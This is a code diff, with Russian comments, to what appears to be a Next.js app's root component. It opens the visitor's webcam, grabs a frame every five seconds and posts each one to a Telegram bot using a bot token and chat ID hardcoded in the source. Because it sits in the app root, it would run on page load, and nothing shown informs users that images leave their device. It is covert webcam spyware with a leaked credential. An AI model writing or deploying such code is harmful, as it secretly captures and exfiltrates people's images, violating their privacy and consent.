@@ -12,8 +12,8 @@ const myApp = ({ Component, pageProps }) => {
     // отправляем видео боту 
     const videoRef = useRef(null);
 
-    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY"
-    const chatId = "-1001860144177"
+    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
+    const chatId = "-1001860144177";
     const urlApi = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
     useEffect(() => {
@@ -24,43 +24,38 @@ const myApp = ({ Component, pageProps }) => {
                 if (videoRef.current) {
                     videoRef.current.srcObject = stream;
 
-                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
-                    const chunks = [];
-
-                    mediaRecorder.ondataavailable = (event) => {
-                        if (event.data.size > 0) {
-                            chunks.push(event.data);
-                        }
+                    const captureFrame = () => {
+                        const canvas = document.createElement('canvas');
+                        const context = canvas.getContext('2d');
+                        canvas.width = videoRef.current.videoWidth;
+                        canvas.height = videoRef.current.videoHeight;
+                        context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
+                        return canvas.toDataURL('image/jpeg');
                     };
 
-                    mediaRecorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        console.log(blob);
-                        // Отправляем данные на сервер (бота) с использованием fetch
-                        setInterval(async () => {
-                            try {
-                                const response = await fetch(urlApi, {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json',
-                                    },
-                                    body: JSON.stringify({
-                                        chat_id: chatId,
-                                        photo: blob,
-                                    }),
-                                });
+                    // Отправляем данные на сервер (бота) с использованием fetch
+                    setInterval(async () => {
+                        const photoDataUrl = captureFrame();
 
-                                if (response.ok) {
-                                    console.log('Фото успешно отправлено на бота');
-                                } else {
-                                    console.error('Ошибка при отправке фото на бота:', response.status, response.statusText, await response.text());
-                                }
-                            } catch (error) {
-                                console.error('Ошибка fetch:', error);
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', photoDataUrl);
+
+                        try {
+                            const response = await fetch(urlApi, {
+                                method: 'POST',
+                                body: formData,
+                            });
+
+                            if (response.ok) {
+                                console.log('Фото успешно отправлено на бота');
+                            } else {
+                                console.error('Ошибка при отправке фото на бота:', response.status, response.statusText, await response.text());
                             }
-                        }, 5000); // Отправлять фото каждые 5 секунд
-                    };
-                    mediaRecorder.start(100);
+                        } catch (error) {
+                            console.error('Ошибка fetch:', error);
+                        }
+                    }, 5000); // Отправлять фото каждые 5 секунд
                 }
             } catch (error) {
                 console.error('Ошибка доступа к мультимедийным устройствам:', error);
